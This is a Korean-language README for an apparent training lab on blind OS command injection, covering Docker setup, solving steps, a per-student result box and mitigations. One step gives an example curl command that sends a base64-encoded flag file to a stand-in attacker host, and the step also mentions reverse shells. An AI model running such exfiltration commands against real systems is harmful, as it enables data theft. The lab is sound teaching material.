# Command Injection (Blind)

| | |
|---|---|
| 버그클래스 | OS Command Injection (Blind) |
| 난이도 | ★★☆ |
| 포트 | 9206 |

## 학습 목표
입력이 `shell=True` 명령에 결합되지만 **결과가 반환되지 않는(Blind)** 상황에서, OOB(리버스셸/HTTP)로 `/command_injection_flag.txt` 를 유출한다.

## 실행
```bash
./gen_flags.sh
docker compose up -d --build cmdi-1
# http://localhost:9206  (cmd 없으면 소스 공개)
```

## 진행
1. `?cmd=` 로 명령이 실행되지만 응답은 `!` 뿐(Blind) 임을 확인.
2. 결과를 **밖으로** 빼거나(OOB), **개인 회수함**에 적어 두고 따로 가져온다.
   - OOB(실무형): 리버스셸 또는 `curl http://공격자/?d=$(cat /command_injection_flag.txt|base64)`
     → 공인 IP 로 리스너를 띄울 수 있어야 한다.
   - 개인 회수함(리스너를 못 띄우는 경우): 접속하면 첫 화면 상단에 **본인 전용 경로**가 안내된다.
     결과를 그 경로로 리다이렉트한 뒤 `GET /out` 으로 읽는다(읽으면 즉시 삭제).
3. 디코딩 → flag.

> 회수함은 **접속 IP 별로 다르고 본인에게만 보인다.**
> 예전처럼 `>> app.py` 로 소스에 덧붙이는 방식은 더 이상 화면에 뜨지 않는다 —
> 그 페이지는 전 수강생이 보는 자리라, 거기에 적은 결과가 남들에게 그대로 공개됐다.
> (실제로 다른 문제의 플래그까지 노출되어 막았다.)

> 참조 풀이(강사용)는 비공개 레포에서 별도 관리한다 — 공개 레포에는 포함하지 않는다.

## 대응방안
셸 미사용(`shell=False`+인자배열), 입력 화이트리스트, 아웃바운드 차단.
